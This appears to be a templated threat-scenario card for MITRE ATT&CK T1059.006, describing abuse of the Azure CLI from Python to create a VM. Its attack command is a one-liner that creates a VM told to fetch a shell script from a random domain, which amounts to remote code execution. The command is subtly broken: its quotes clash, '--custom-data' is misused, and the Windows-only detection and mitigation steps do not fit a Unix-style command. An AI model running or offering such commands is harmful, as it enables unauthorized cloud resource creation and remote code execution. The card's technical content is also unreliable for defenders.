---
type: campaign
scenario_id: 307
tactic: Execution
technique: "T1059.006: Python"
technique_id: T1059.006
tags: [campaign, lotl, execution]
---

# Using Python to abuse az CLI for Azure VM creation.

## Threat Description
Using Python to abuse az CLI for Azure VM creation.

## Attack Command
```
python -c "import os; os.system('az vm create --resource-group $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) --name $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) --image UbuntuLTS --custom-data http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sh')"
```

## Detection Logic
Monitor az CLI: `wmic process where name='python.exe' get commandline | findstr az`; Audit Azure logs: Azure Activity Logs.

## Mitigation
Restrict az CLI: `icacls %userprofile%\.azure /deny Everyone:RX`; Enforce MFA: Azure IAM policies.

## AI Training Prompt
Train AI to detect unauthorized az CLI execution and suggest MFA enforcement.

## References
- MITRE ATT&CK T1059.006: https://attack.mitre.org/techniques/T1059/006/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
